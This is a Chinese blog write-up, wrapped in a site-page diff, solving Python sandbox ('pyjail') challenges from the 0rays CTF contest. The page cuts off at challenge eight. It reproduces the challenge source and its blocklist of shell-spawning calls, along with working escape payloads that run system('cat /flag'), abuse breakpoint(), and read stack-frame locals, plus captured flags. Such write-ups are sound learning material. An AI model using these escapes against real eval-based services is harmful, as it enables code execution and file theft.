@@ -1,0 +1,1392 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="s0k1y">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="0rays招新赛 比赛进行了三天，最终排了12名，比自己认为的结果好一点，ctf的话我还在初学状态，还要继续加油! 祝 2024 一路顺风 Pyjail Pyjail   我之前只接触过一点pyjail，但习惯存笔记 是边学边做的 前几个都挺简单 直接打就ok 藏在环境变量里了  pyjail2 WELCOME &#x3D; ‘’’  | |  | ____\ \  &#x2F; &#x2F; _| |   | \ | |">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2023年末_0rays招新赛">
+<meta property="og:url" content="https://s0k1y.github.io/2024/01/01/CBCTF/index.html">
+<meta property="og:site_name" content="s0k1y&#39;s world">
+<meta property="og:description" content="0rays招新赛 比赛进行了三天，最终排了12名，比自己认为的结果好一点，ctf的话我还在初学状态，还要继续加油! 祝 2024 一路顺风 Pyjail Pyjail   我之前只接触过一点pyjail，但习惯存笔记 是边学边做的 前几个都挺简单 直接打就ok 藏在环境变量里了  pyjail2 WELCOME &#x3D; ‘’’  | |  | ____\ \  &#x2F; &#x2F; _| |   | \ | |">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101210357306.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101210158148.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230195505305.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230202058509.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230202215233.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230204803341.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230213024485.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230213412476.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230231335976.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3167109/202311/3167109-20231105210217071-751520816.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101111153757.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101112344385.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101112626332.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231231011440323.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230094016989.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230094025074.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231231084554889.png">
+<meta property="og:image" content="https://image.3001.net/images/20211119/1637308825_619759992d43a3b586529.png!small">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231231140634784.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231231140924176.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231231150503334.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231231152008650.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230160906147.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230161226648.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230162504375.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101012742813.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101021928005.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101124114949.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101124059427.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101124159682.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230100119014.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230105344499.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230105809617.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230105856162.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231231154143347.png">
+<meta property="og:image" content="http://img.mp.itc.cn/q_mini,c_zoom,w_640/upload/20170615/716f1c264aef4ea0a1f6b8b4dcfa9be0_th.jpg">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231231155036279.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231231211149638.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101141831314.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101180835810.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101180927920.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101182024195.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101181249352.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101182121236.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101184010183.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101202459405.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101203131057.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231231213502848.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101212200012.png">
+<meta property="article:published_time" content="2024-01-01T00:30:00.000Z">
+<meta property="article:modified_time" content="2024-01-01T17:15:49.951Z">
+<meta property="article:author" content="s0k1y">
+<meta property="article:tag" content="wp">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101210357306.png">
+  
+  
+  
+  <title>2023年末_0rays招新赛 - s0k1y&#39;s world</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"s0k1y.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="2023年末_0rays招新赛"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-01-01 08:30" pubdate>
+          2024年1月1日 早上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          25k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          206 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">2023年末_0rays招新赛</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1>0rays招新赛</h1>
+<p>比赛进行了三天，最终排了12名，比自己认为的结果好一点，ctf的话我还在初学状态，还要继续加油!</p>
+<p>祝 2024 一路顺风</p>
+<h5 id="Pyjail">Pyjail</h5>
+<h6 id="Pyjail-2">Pyjail</h6>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101210357306.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101210158148.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>我之前只接触过一点pyjail，但习惯存笔记</p>
+<p>是边学边做的</p>
+<p>前几个都挺简单</p>
+<p>直接打就ok</p>
+<p>藏在环境变量里了</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230195505305.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<h6 id="pyjail2">pyjail2</h6>
+<p>WELCOME = ‘’’</p>
+<hr>
+<p>| |  | ____\ \  / / _<em><strong>| |   |</strong></em> \</p>
+<p>| |  |  _|  \ \ / /|  _| | |    __) |</p>
+<p>| |<em><strong>| |</strong></em>  \ V / | |<em><strong>| |</strong></em>  / __/</p>
+<p>|<em><strong><strong>|</strong></strong></em>|  _/  |<em><strong><strong>|</strong></strong></em>| |_____|</p>
+<p>​</p>
+<p>‘’’</p>
+<p>print(WELCOME)</p>
+<p>print(“Welcome to the JBNRZ’s pyjail”)</p>
+<p>print(“Enter your expression and I will evaluate it for you.”)</p>
+<p>print(&quot;Example: &quot;)</p>
+<p>print(&quot;  input: 1 + 1&quot;)</p>
+<p>print(&quot;  Result: 2&quot;)</p>
+<p>input_data = input(&quot;&gt; &quot;)</p>
+<p>try:</p>
+<p>print(“Result: {}”.format(eval(input_data)))</p>
+<p>except Exception as e:</p>
+<p>print(f&quot;Result: {e}&quot;)</p>
+<p>nc</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230202058509.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<ul>
+<li>简单的随便找一个payload就能打</li>
+<li>[ x.<strong>init</strong>.<strong>globals</strong> for x in ‘’.<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>() if x.<strong>name</strong>==“_wrap_close”][0][“system”](“cat /flag”)</li>
+</ul>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230202215233.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<h6 id="pyjail3">pyjail3</h6>
+<p>WELCOME = ‘’’</p>
+<hr>
+<p>| |  | ____\ \  / / _<em><strong>| |   |</strong></em> /</p>
+<p>| |  |  _|  \ \ / /|  <em>| | |    |</em> \</p>
+<p>| |<em><strong>| |</strong></em>  \ V / | |<em><strong>| |</strong></em>  ___) |</p>
+<p>|<em><strong><strong>|</strong></strong></em>|  _/  |<em><strong><strong>|</strong></strong></em>| |____/</p>
+<p>​</p>
+<p>‘’’</p>
+<p>print(WELCOME)</p>
+<p>print(“Welcome to the JBNRZ’s pyjail”)</p>
+<p>print(“Enter your expression and I will evaluate it for you.”)</p>
+<p>print(&quot;Example: &quot;)</p>
+<p>print(&quot;  input: 1 + 1&quot;)</p>
+<p>print(&quot;  Result: 2&quot;)</p>
+<p>input_data = input(&quot;&gt; &quot;)</p>
+<p>if len(input_data) &gt; 13:</p>
+<p>print(“It’s too long to eval”)</p>
+<p>exit(0)</p>
+<p>try:</p>
+<p>print(“Result: {}”.format(eval(input_data)))</p>
+<p>except Exception as e:</p>
+<p>print(f&quot;Result: {e}&quot;)</p>
+<p>有了长度限制</p>
+<p>pyload：exec(input()) 绕过输入长度限制</p>
+<p>小心空格</p>
+<p>CBCTF{9b8d0d15-84d3-4dae-89f0-ac8d83e8de20}</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230204803341.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<h6 id="pyjail4">pyjail4</h6>
+<p>WELCOME = ‘’’</p>
+<hr>
+<p>| |  | ____\ \  / / ____| |   | || |</p>
+<p>| |  |  _|  \ \ / /|  <em>| | |   | || |</em></p>
+<p>| |<em><strong>| |</strong></em>  \ V / | |<em><strong>| |</strong></em>  |__  _|</p>
+<p>|<em><strong><strong>|</strong></strong></em>|  _/  |<em><strong><strong>|</strong></strong></em>|   |_|</p>
+<p>​</p>
+<p>‘’’</p>
+<p>print(WELCOME)</p>
+<p>print(“Welcome to the JBNRZ’s pyjail”)</p>
+<p>print(“Enter your expression and I will evaluate it for you.”)</p>
+<p>print(&quot;Example: &quot;)</p>
+<p>print(&quot;  input: 1 + 1&quot;)</p>
+<p>print(&quot;  Result: 2&quot;)</p>
+<p>input_data = input(&quot;&gt; &quot;)</p>
+<p>if len(input_data) &gt; 12:</p>
+<p>print(“It’s too long to eval”)</p>
+<p>exit(0)</p>
+<p>try:</p>
+<p>print(“Result: {}”.format(eval(input_data)))</p>
+<p>except Exception as e:</p>
+<p>print(f&quot;Result: {e}&quot;)</p>
+<p>啊啊啊啊啊啊啊</p>
+<p>又限制字符啦！</p>
+<p>啊啊啊啊啊啊啊</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230213024485.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>breakpoint()</p>
+<p>然后直接写py代码就行</p>
+<h6 id="oyjail5">oyjail5</h6>
+<p>WELCOME = ‘’’</p>
+<hr>
+<p>| |  | ____\ \  / / ____| |   | ___|</p>
+<p>| |  |  <em>|  \ \ / /|  <em>| | |   |</em></em>_ \</p>
+<p>| |<em><strong>| |</strong></em>  \ V / | |<em><strong>| |</strong></em>  ___) |</p>
+<p>|<em><strong><strong>|</strong></strong></em>|  _/  |<em><strong><strong>|</strong></strong></em>| |____/</p>
+<p>​</p>
+<p>‘’’</p>
+<p>black = [“input”, “import”, “os”, “open”, “popen”, “system”, “read”, “_”, “'”, “&quot;”]</p>
+<p>print(WELCOME)</p>
+<p>print(“Welcome to the JBNRZ’s pyjail”)</p>
+<p>print(“Enter your expression and I will evaluate it for you.”)</p>
+<p>print(&quot;Example: &quot;)</p>
+<p>print(&quot;  input: 1 + 1&quot;)</p>
+<p>print(&quot;  Result: 2&quot;)</p>
+<p>input_data = input(&quot;&gt; &quot;)</p>
+<p>if any([i in input_data for i in black]):</p>
+<p>print(“Ohhhh, what are you doing???!!!”)</p>
+<p>exit(0)</p>
+<p>try:</p>
+<p>print(“Result: {}”.format(eval(input_data)))</p>
+<p>except Exception as e:</p>
+<p>print(f&quot;Result: {e}&quot;)</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230213412476.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>没有过滤breakpoint哦</p>
+<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&quot;cat /flag&quot;</span>)</span><br></code></pre></td></tr></table></figure>
+<h6 id="pyjail-6">pyjail 6</h6>
+<p>from string import ascii_letters</p>
+<p>WELCOME = ‘’’</p>
+<hr>
+<p>| |  | ____\ \  / / ___<em>| |    / /</em></p>
+<p>| |  |  _|  \ \ / /|  <em>| | |   | ’</em> \</p>
+<p>| |<em><strong>| |</strong></em>  \ V / | |<em><strong>| |</strong></em>  | (_) |</p>
+<p>|<em><strong><strong>|</strong></strong></em>|  _/  |<em><strong><strong>|</strong></strong></em>|  ___/</p>
+<p>​</p>
+<p>‘’’</p>
+<p>print(WELCOME)</p>
+<p>print(“Welcome to the JBNRZ’s pyjail”)</p>
+<p>print(“Enter your expression and I will evaluate it for you.”)</p>
+<p>print(&quot;Example: &quot;)</p>
+<p>print(&quot;  input: 1 + 1&quot;)</p>
+<p>print(&quot;  Result: 2&quot;)</p>
+<p>input_data = input(&quot;&gt; &quot;)</p>
+<p>if any([i in ascii_letters for i in input_data]):</p>
+<p>print(“Ohhhh, what are you doing???!!!”)</p>
+<p>exit(0)</p>
+<p>try:</p>
+<p>print(“Result: {}”.format(eval(input_data)))</p>
+<p>except Exception as e:</p>
+<p>print(f&quot;Result: {e}&quot;)</p>
+<p>Python 3 开始支持非ASCII字符的标识符，也就是说，可以使用 Unicode 字符作为 Python 的变量名</p>
+<p>如breakpoint   见主机中UNicode欺骗我的脚本</p>
+<p>𝔟𝔯𝔢𝔞𝔨𝔭𝔬𝔦𝔫𝔱()</p>
+<p>CBCTF{52fb1c00-1675-472b-9b24-9ac8bf846aff}</p>
+<h6 id="pyjail7">pyjail7</h6>
+<p>nc training.0rays.club 10039</p>
+<hr>
+<p>| |   | <em><em><strong>\ \   / / <em><em><strong>| |     |</strong></em>  |<br>
+| |   |  <em>|  \ \ / /|  <em>| | |        / /<br>
+| |</em></em></em>| |</strong></em>  \ V / | |</em><strong>| |</strong>_    / /<br>
+|<em><strong><strong>|</strong></strong></em>|  _/  |<em><strong><strong>|</strong></strong></em>|  /_/</p>
+<p>You have three choice:</p>
+<ol>
+<li>
+<p>Play the guessing game</p>
+</li>
+<li>
+<p>Get important code about lucky_num</p>
+</li>
+<li></li>
+</ol>
+<p>black = {‘pty.spawn’, ‘os.system’, ‘os.exec’, ‘os.posix_spawn’, ‘os.spawn’, ‘subprocess.Popen’}</p>
+<p>…</p>
+<p>def guess():<br>
+game_score = 0<br>
+sys.stdout.write('Can u guess the number? between 1 and 1000 &gt; ')<br>
+sys.stdout.flush()</p>
+<p>​    my_lucky_num = [random.randint(1, 1000) for _ in range(5)]<br>
+​    sys.stdout, sys.stderr, challenge_original_stdout = StringIO(), StringIO(), sys.stdout<br>
+​    input_data = input()<br>
+​    try:<br>
+​        input_data = eval_func(input_data, {}, {})<br>
+​    except Exception:<br>
+​        return game_score, my_lucky_num<br>
+​    sys.stdout = challenge_original_stdout<br>
+​    print(input_data)<br>
+​    if input_data == my_lucky_num:<br>
+​        game_score += 1<br>
+​    return game_score, my_lucky_num=</p>
+<p><strong>import</strong>(“sys”).<strong>stdout</strong>.write(str(<strong>import</strong>(‘sys’)._getframe(1).f_locals))<br>
+---------------------<br>
+<img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230231335976.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>you need to guess my five lucky numbers.</p>
+<p><img src="https://img2023.cnblogs.com/blog/3167109/202311/3167109-20231105210217071-751520816.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>input_ex: [1, 2, 3, 4, 5]<br>
+Can u guess the number? between 1 and 1000 &gt; <strong>import</strong>(“sys”).<strong>stdout</strong>.write(str(<strong>import</strong>(‘sys’)._getframe(1).f_locals))<br>
+{‘game_score’: 0, ‘my_lucky_num’: [456, 787, 997, 625, 528], _</p>
+<p>_‘challenge_original_stdout’:</p>
+<p>_ &lt;_io.TextIOWrapper name=‘<stdout>’ mode=‘w’ encoding=‘utf-8’&gt;, ‘input_data’: _</p>
+<p>_</p>
+<p>可以获取调用栈的帧对象，默认的参数是0，但是在这里如果传入0的话就会获取eval的调用栈帧，所以得deep一层</p>
+<p><strong>import</strong>(“sys”).<em>getframe(1)<br>
+我们试试看是啥情况，有个小技巧，可以使用__import</em>_(“sys”).<strong>stdout</strong>.write去进行标准输出，这也是上一个非预期的输出方法。</p>
+<p><strong>import</strong>(“sys”).<strong>stdout</strong>.write(str(<strong>import</strong>(‘sys’)._getframe(1)))<br>
+Welcome to my guesser game!<br>
+Can u guess the number? between 1 and 9999999999999 &gt; <strong>import</strong>(“sys”).<strong>stdout</strong>.write(str(<strong>import</strong>(‘sys’)._getframe(1)))<br>
+Guess game end!!!<br>
+这里的frame对象指向了’/home/ctf/./server.py’这个file，那么直接调用f_locals属性查看变量</p>
+<p><strong>import</strong>(“sys”).<strong>stdout</strong>.write(str(<strong>import</strong>(‘sys’)._getframe(1).f_locals))</p>
+<p>_</p>
+<p><strong>import</strong>(“sys”).<strong>stdout</strong>.write(str(<strong>import</strong>(‘sys’)._getframe(1).f_locals[“my_lucky_num”]))</p>
+<p>单独取出字典中对应值</p>
+<p>input_ex: [1, 2, 3, 4, 5]<br>
+Can u guess the number? between 1 and 1000 &gt; <strong>import</strong>(“sys”).<strong>stdout</strong>.write(str(<strong>import</strong>(‘sys’)._getframe(1).f_locals[“my_lucky_num”]))<br>
+[202, 653, 556, 715, 200]The correct number is: [202, 653, 556, 715, 200]<br>
+Please try again if you really want to play that game.</p>
+<p>​</p>
+<p>_‘<strong>import</strong>(“sys”).<strong>stdout</strong>.write(str(<strong>import</strong>('sys')._getframe(1).f_locals))’}The correct number is: [456, 787, 997, 625, 528]<br>
+Please try again if you really want to play that game.]</p>
+<p>str(<strong>import</strong>(‘sys’)._getframe(1).f_locals[“my_lucky_num”])</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">list</span><span class="hljs-params">(map(int, str(__import__(<span class="hljs-string">&#x27;sys&#x27;</span>)</span></span>.<span class="hljs-built_in">_getframe</span>(<span class="hljs-number">1</span>)<span class="hljs-selector-class">.f_locals</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;my_lucky_num&quot;</span>]</span>)))<br></code></pre></td></tr></table></figure>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">直接<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;sys&#x27;</span>).<span class="hljs-built_in">_getframe</span>(<span class="hljs-number">1</span>)<span class="hljs-selector-class">.f_locals</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;my_lucky_num&quot;</span>]</span><br></code></pre></td></tr></table></figure>
+<p>然后eval就行</p>
+<p>CBCTF{7df28655-3c0f-4ebe-985b-e18c60988982}</p>
+<h6 id="pyjail8">pyjail8</h6>
+<p>WELCOME = ‘’’</p>
+<hr>
+<p>| |  | ____\ \  / / ____| |    ( _ )</p>
+<p>| |  |  _|  \ \ / /|  _| | |    / _ \</p>
